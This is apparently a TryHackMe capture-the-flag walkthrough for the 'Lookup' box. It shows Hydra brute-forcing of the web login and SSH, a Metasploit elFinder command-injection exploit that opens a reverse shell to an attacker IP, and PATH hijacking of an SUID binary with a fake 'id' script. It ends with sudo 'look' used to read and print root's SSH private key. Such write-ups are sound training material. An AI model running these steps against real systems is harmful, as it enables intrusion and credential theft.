---
tags:
  - THM
  - Linux
  - Easy
  - Brute-Force
  - Metasploit
  - SUID
  - PATH-HJ
  - Leakage
  - Sudo
---
https://tryhackme.com/room/lookup/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.137.25 lookup.thm files.lookup.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC lookup.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The website is a login panel. During login attempts, the response changes with **valid usernames** and **valid passwords**.

Response for `root:password`:
```text
Wrong username or password. Please try again.  
Redirecting in 3 seconds.
```
Response for `admin:password`:
```text
Wrong password. Please try again.  
Redirecting in 3 seconds.
```
# Website Enumeration
Found **user admin** and **user jose**:
```console
$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong username" -t 64

[80][http-post-form] host: lookup.thm   login: admin   password: password
[80][http-post-form] host: lookup.thm   login: jose   password: password
```
Found **password** for **user jose**:
```console
$ hydra -l jose -P /usr/share/dict/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Please try again." -t 64

[80][http-post-form] host: lookup.thm   login: jose   password: password123
```
Login redirects to [elFinder file manager](https://github.com/Studio-42/elFinder) website at [files.lookup.thm](http://files.lookup.thm/).
# Exploitation
The current **elFinder version 2.1.47** is vulnerable to a [Metasploit exploit](https://www.exploit-db.com/exploits/46539).

Run the exploit:
```console
$ msfconsole

msf6 > use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.thm
RHOSTS => files.lookup.thm

msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST <ATTACKER-IP>
LHOST => <ATTACKER-IP>

msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
```
# Post-Exploitation
## Read passwords
Found `/usr/sbin/pwm` with **SUID permission**:
```console
$ find / -perm -4000 2>/dev/null | grep -v ^/snap

/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```
The binary runs the `id` command to extract data from `~/.passwords`:
```console
$ /usr/sbin/pwm

[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```
Found **user think** with a `/home/think/.passwords` file:
```console
$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
think:x:1000:1000:,,,:/home/think:/bin/bash

$ ls -l /home/think/.passwords
-rw-r----- 1 root think 525 Jul 30  2023 /home/think/.passwords
```
Created own `id` command:
```console
$ echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id

$ chmod +x /tmp/id
```
Add the `id` command to the PATH and execute `/usr/sbin/pwm` to read the passwords file:
```console
$ export PATH=/tmp:$PATH

$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```
In the attacker's machine saved the password list for **user think** at `/tmp/passwords.txt`.

Brute-force SSH to get **user think password**:
```console
$ hydra -l think -P /tmp/passwords.txt ssh://lookup.thm

[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
```
Log in as **user think** via SSH:
```bash
ssh think@lookup.thm
```
Get the **user flag**:
```bash
cat /home/think/user.txt
```
## Privilege Escalation
**User think** can run `/usr/bin/look` with **sudo privileges**:
```console
$ sudo -l

Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```
Read private SSH key of **user root**:
```console
$ sudo /usr/bin/look '' /root/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
In the attacker's machine, copy the private SSH key into `id_rsa` file. Then, log in as **user root** via SSH:
```console
$ nano id_rsa

$ chmod 600 id_rsa

$ ssh -i id_rsa root@lookup.thm
```
Get the **root flag**:
```bash
cat /root/root.txt
```